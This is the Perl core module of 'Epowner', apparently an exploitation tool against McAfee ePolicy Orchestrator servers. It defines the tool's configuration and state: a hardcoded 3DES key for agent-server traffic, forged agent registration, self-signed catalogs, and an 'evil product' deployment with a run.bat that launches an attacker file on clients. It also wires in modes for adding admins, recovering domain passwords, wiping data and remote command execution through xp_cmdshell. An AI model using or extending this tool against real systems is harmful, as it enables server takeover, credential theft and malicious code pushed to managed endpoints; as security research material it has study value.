package Epowner::Epo;

use strict;
use warnings;

use IO::Socket::SSL qw( SSL_VERIFY_NONE );
use Crypt::OpenSSL::DSA;
use Crypt::Rijndael;


# some constanst values
use base 'Exporter';
use constant {
	DEPLOY_FILE => 0,
	DEPLOY_CMD  => 1,
	DEPLOY_CUSTOM  => 2,
};
our @EXPORT_OK = ('DEPLOY_FILE', 'DEPLOY_CMD', 'DEPLOY_CUSTOM');
our %EXPORT_TAGS = ( constants => [ 'DEPLOY_FILE', 'DEPLOY_CMD', 'DEPLOY_CUSTOM' ] );

# Various Epowner modules
use Epowner::Config;
use Epowner::Compress;
use Epowner::Print;
use Epowner::HTTP;
use Epowner::StringsManipulation;
use Epowner::Catalog;
use Epowner::PkgCatalog;
use Epowner::SQL;

# Crypto
use Epowner::DSA;
use Epowner::RSA;
use Epowner::3DES;
use Epowner::AES;

# Binary structures
use Epowner::BuildStructFullProps;
use Epowner::BuildStructRegister;
use Epowner::BuildStructEvent;

# Tomcat modules
use Epowner::TomcatLogin;
use Epowner::TomcatAutomaticResponses;

# Epowner modes
use Epowner::ModeCommon;
use Epowner::ModeCheck;
use Epowner::ModeRegister;
use Epowner::ModeAddAdmin;
use Epowner::ModeReadDB;
use Epowner::ModeGatherInfo;
use Epowner::ModeDomainPasswd;
use Epowner::ModeWipe;
use Epowner::ModeServerExec;
use Epowner::ModeServerUpload;
use Epowner::ModeClientDeploy;
use Epowner::ModeSQL;



sub new{
        my $this = {};

        my ($class) = @_; # get the parameters


	# cabextract linux tool
	$this->{cabextract_path}     = `which cabextract`;
	$this->{cabextract_path}     =~ s/\n//g;
	# test cabextract
	if (not -f $this->{cabextract_path}) {
		print "ERROR: 'cabextract' was not found on your system. Please apt-getize cabextract\n";
		exit;
	}

	# lcab linux tool
        $this->{lcab_path}     = `which lcab`;
        $this->{lcab_path}     =~ s/\n//g;
        # test cabextract
        if (not -f $this->{lcab_path}) {
                print "ERROR: 'lcab' was not found on your system. Please apt-getize lcab\n";
                exit;
        }

	# 7z tool
        $this->{seven_z_path}     = `which 7z`;
        $this->{seven_z_path}     =~ s/\n//g;
        # test 7z
        if (not -f $this->{seven_z_path}) {
                print "ERROR: '7z' was not found on your system. Please apt-getize 7z\n";
                exit;
        }

	

	$this->{vulnerable}	     = 0;	# updated by --check

	$this->{state_registered}    = 0; 	# updated by --register and --unregister

	$this->{use_color}	     = 1;	# colored output ?

	# 3DES key
	# This key is used for both catalog.z, PkgCatalog.z and agent-server communication
	$this->{des3_symkey} 	     = '<!@#$%^>';

	# AES-128 Key
	# This key is used to encrypt Domain creds inside the database. This key is stored inside orion.keystore file on the server
	# The key is recovered by "--ad-creds"
	$this->{aes_symkey_keystore} = '';

	# Server variables
	$this->{server_host}         = 0;  
	$this->{server_port}         = 443;
	$this->{server_consoleport}  = 8443;
	$this->{server_pubkeyhash}   = 0;
	$this->{server_is_dba}       = 0;  # updated by "check mode"
	$this->{server_force_nondba} = 0;  
	$this->{server_mssql_whoami} = ''; # updated by "check mode". If 'server_is_dba' is true, do we have SYSTEM priv or "Network Service" ?
	
	$this->{server_db_folder}    		= ''; # filled-in by --get-install-path
	$this->{server_db_folder_default}    	= 'C:\PROGRA~2\McAfee\EPOLIC~1\DB';
	$this->{server_tomcat_folder}		= '';
	$this->{server_tomcat_folder_default}  	= 'C:\PROGRA~2\McAfee\EPOLIC~1\Server';
	$this->{server_apache_folder}		= '';
	$this->{server_apache_folder_default}	= 'C:\PROGRA~2\McAfee\EPOLIC~1\Apache2';
	$this->{server_install_folder}		= '';
	$this->{server_install_folder_default}	= 'C:\PROGRA~2\McAfee\EPOLIC~1';

	$this->{server_servername}   = ''; # feeded by ModeReadDB  		

	# Remote command exec
	$this->{srv_exec_mode}	     = 0;  # Which mode to use for remote code exec on the ePo server ?
					   # 0	: Not defined yet
					   # 1  : Use DBA mode (xp_cmdshell) because we found that MSSQL run with SYSTEM account
					   # 2  : Use Non-DBA mode (automatic response rule).
	$this->{srv_exec_priv}	     = 0;  # do we have high privilege (SYSTEM) in the current 'srv_exec_mode' ?


	# Agent variables
	$this->{agent_hostname}      = 0; 
	$this->{agent_ip}            = 0;
	$this->{agent_subnet}        = 0;
	$this->{agent_netmask}       = 0;
	$this->{agent_mac}           = 0;
	$this->{agent_guid}          = 0;
	$this->{agent_seqnum}        = 1;

	$this->{verbose} 	     = 0;
	$this->{force} 	     	     = 0;
	$this->{dsa_agent} 	     = Crypt::OpenSSL::DSA->new();


	# States
	$this->{state_exec_nondba_setup} = 0; # did we already ran --srv-exec --setup-nondba ?
	$this->{state_add_admin}         = 0; # did we already ran --add-admin ?
	$this->{state_cli_deploy}        = 0; # did we use --cli-deploy ? (flag used by --clean-all)

	# Tag
	$this->{common_prefix}	        = '';	# Used to build various name inside ePo DB and webconsole
						# Cleanup functions use this tag to recognise any entries we've created
						# during a previous session. Value is generated during --register

	# config filenmanes
	$this->{config_file}                 = "epo.conf";
	$this->{agent_dsa_filename_private}  = "agent-dsa-priv.pem";

	# variables for building HTTP requests
	$this->{binary_header1}		= '';
	$this->{binary_header2}		= '';
	$this->{props_xml}		= '';
	$this->{event_xml}		= '';


	# Tomcat
	$this->{browser}		= '';	# User-Agent object
	$this->{security_token}		= '';	# tomcat token
	$this->{admin_username}		= ''; 
	$this->{admin_password}		= ''; 


	# Variables for --register
	$this->{dsa_reqseckey_private} = Crypt::OpenSSL::DSA->new();
	$this->{agent_pubkey_epo_format} = '';


	$this->{temp_folder}		= 'tmp/';

	# catalog DSA & RSA keys
	$this->{catalog_dsa_folder}	= "$this->{temp_folder}dsa/";
	$this->{catalog_rsa_folder}     = "$this->{temp_folder}/rsa/";
	$this->{catalog_dsa_pub_file}   = 'smpubkey.bin';
	$this->{catalog_rsa_pub_file}   = 'smpubkey.bin';
	$this->{catalog_dsa_priv_file}  = 'smseckey.bin';
	$this->{catalog_rsa_priv_file}  = 'smseckey.pem'; # we need pem file here


	# catalog files
	$this->{catalog_tmp_folder}	= "$this->{temp_folder}/catalog/";
	$this->{catalog_xml_file}	= 'catalog.xml';
	$this->{catalog_cab_file}	= 'catalog.cab.tmp';
	$this->{catalog_signedcab_file}	= 'catalog.cab';
	$this->{catalog_z_file}		= 'catalog.z';

        # PkgCatalog DSA & RSA keys
        $this->{pkgcatalog_dsa_folder}     = $this->{catalog_dsa_folder};
        $this->{pkgcatalog_rsa_folder}     = $this->{catalog_rsa_folder};
        $this->{pkgcatalog_dsa_pub_file}   = $this->{catalog_dsa_pub_file};
        $this->{pkgcatalog_rsa_pub_file}   = $this->{catalog_rsa_pub_file};
        $this->{pkgcatalog_dsa_priv_file}  = $this->{catalog_dsa_priv_file};
        $this->{pkgcatalog_rsa_priv_file}  = $this->{catalog_rsa_priv_file}; 

	# PkgCatalog files
        $this->{pkgcatalog_tmp_folder}     = "$this->{temp_folder}/pkgcatalog/";
        $this->{pkgcatalog_xml_file}       = 'PkgCatalog.xml';
        $this->{pkgcatalog_cab_file}       = 'PkgCatalog.cab.tmp';
        $this->{pkgcatalog_signedcab_file} = 'PkgCatalog.cab';
        $this->{pkgcatalog_z_file}         = 'PkgCatalog.z';

	# unzip.exe (used by --deploy)
	$this->{unzip_local_file}	= "tools/unzip.exe";
	$this->{unzip_remote_file}	= "unzip00000000000000000.exe";

	# DumpKey.class
	$this->{tool_dumpkey}		= 'tools/DumpKey0000000000000.class';


	# Softwar deploymnt soft
	$this->{deploy_local_repository} 	= "$this->{temp_folder}/deployment/repo/";	# build repository tree
	$this->{deploy_local_zipfile} 	 	= "$this->{temp_folder}/deployment/repo.zip";	# zipped repo (local filename)
	$this->{deploy_remote_zipfile} 	 	= "repo000000000000000000.zip";			# zipped repo (remote file name), to upload and decompress on server
	$this->{deploy_evil_product_id}  	= '';	    # generated once during --register. used by --deploy and for cleaning..
	$this->{deploy_evil_product_version}  	= '4.5.0';
	$this->{deploy_evil_product_build}  	= '1471';
	$this->{deploy_products_replica_log}	= "$this->{temp_folder}/deployment/replica.log";
	$this->{deploy_run_bat}			= "$this->{temp_folder}/deployment/run.bat";	# batch file wich will start our evil file, or execute our command
												# during software deployment
	
	# Software Managment keys
	$this->{smkey_dsa}		= $this->{catalog_dsa_folder} ;
	$this->{smkey_rsa}		= $this->{catalog_rsa_folder} ;



	#git-issue-1
	#-----------
	# local path to srpubkey.bin 
        $this->{srpubkey_bin}  = '';             # Public DSA key of server
	# local path to reqseckey.bin
        $this->{reqseckey_bin} = '';             # "Common" private DSA key for registration request signature
	# local path to framepkg.exe
	$this->{framepkg_exe} = '';


	# drop previous temp folder if any ..
	rmtree($this->{temp_folder});
	
	bless $this, $class;
        return $this;
}

# Conf file
sub set_config_file {
        my $this = shift; my $data = shift;
        $this->{config_file} = $data;
}

sub get_config_file {
	 my $this = shift; return $this->{config_file};
}

sub set_no_color{
	my $this = shift; 
        $this->{use_color} = 0;
}

sub set_force{
        my $this = shift;
        $this->{force} =1;
}

sub set_server_console_port {
        my $this = shift; my $data = shift;
        $this->{server_consoleport} = $data;
}

sub set_registered{
        my $this = shift;
	$this->{state_registered} = 1;
}

sub have_dba_privs{
	my $this = shift;
	return $this->{server_is_dba};
}

sub get_srv_exec_mode{
	my $this = shift;
	return $this->{srv_exec_mode};
}

sub have_srv_exec_priv(){
        my $this = shift;
        return $this->{srv_exec_priv};
}

sub init_prefix{
	my $this = shift;
	$this->{common_prefix} = random_string_alphanum_lower(6);
}
sub init_productid{
        my $this = shift;
        $this->{deploy_evil_product_id} = random_string_upper(8);
}


# Verbose
sub set_verbose_mode {
        my $this = shift; my $data = shift;
        $this->{verbose} = $data;;
}
sub get_verbose_mode {
        my $this = shift;
        return $this->{verbose};
}

# Server host
sub set_server_host{
	my $this = shift; my $data = shift;
	$this->{server_host} = $data;
}
sub get_server_host{
        my $this = shift; return $this->{server_host};
}

# Server port
sub set_server_port{
        my $this = shift; my $data = shift;
        $this->{server_port} = $data;
}
sub get_server_port{
        my $this = shift; return $this->{server_port};
}

# Agent hostname
sub set_agent_hostname{
        my $this = shift; my $data = shift;
        $this->{agent_hostname} = $data;
	print "      [+] Agent Hostname: " . $this->{agent_hostname}. "\n" if $this->{verbose};
}
sub get_agent_hostname{
        my $this = shift; return $this->{agent_hostname};
}

# Agent IP
sub set_agent_ip{
        my $this = shift; my $data = shift;
        $this->{agent_ip} = $data;
	$this->{agent_subnet} = $data;
	$this->{agent_subnet}  =~ s/\.[0-9]+$/.0/;       # let's say we want C class
	$this->{agent_netmask} = '255.255.255.0';
	print "      [+] Agent IP: " . $this->{agent_ip}. "/24\n" if $this->{verbose};
}
sub get_agent_ip{
        my $this = shift; return $this->{agent_ip};
}

# Agent Mac
sub set_agent_mac{
        my $this = shift; my $data = shift;
        $this->{agent_mac} = $data;
        print "      [+] Agent MAC: " . $this->{agent_mac}. "\n" if $this->{verbose};
}
sub get_agent_mac{
        my $this = shift; return $this->{agent_mac};
}


# Agent GUID
sub generate_agent_guid {
	my $this = shift;
	$this->{agent_guid} = generate_guid();
	print "      [+] Agent GUID : " . $this->{agent_guid}. "\n" if $this->{verbose};
}
sub get_agent_guid{
        my $this = shift; return $this->{agent_guid};
}

# DBA mode
sub set_force_nondba{
        my $this = shift; 
        $this->{server_force_nondba} = 1;
        print "      [+] Forcing Cmd EXE in Non-DBA mode\n" if $this->{verbose};
}
sub get_force_nondba{
        my $this = shift;
        return $this->{server_force_nondba};
}


#git-issue-1
#-----------
sub set_path_srpubkey_bin{
	my $this = shift;
        $this->{srpubkey_bin}  = shift;
                
	# file exists ?
	if(not -f $this->{srpubkey_bin}){
		print "[-] ERROR (srpubkey_bin): file not found at '" . $this->{srpubkey_bin}. "'\n";
		exit;
	}
	print "      [+] Local path to srpubkey.bin : " . $this->{srpubkey_bin} . "\n" if $this->{verbose};
}
sub set_path_reqseckey_bin{
        my $this = shift;
        $this->{reqseckey_bin}  = shift;

        # file exists ?
        if(not -f $this->{reqseckey_bin}){
                print "[-] ERROR (reqseckey_bin): file not found at '" . $this->{reqseckey_bin}. "'\n";
                exit;
        }
        print "      [+] Local path to reqseckey.bin : " . $this->{reqseckey_bin} . "\n" if $this->{verbose};
}
sub set_path_framepkg_exe{
        my $this = shift;
        $this->{framepkg_exe}  = shift;

        # file exists ?
        if(not -f $this->{framepkg_exe}){
                print "[-] ERROR (framepkg_exe): file not found at '" . $this->{framepkg_exe}. "'\n";
                exit;
        }
        print "      [+] Local path to framepkg.exe : " . $this->{framepkg_exe} . "\n" if $this->{verbose};
}


1;
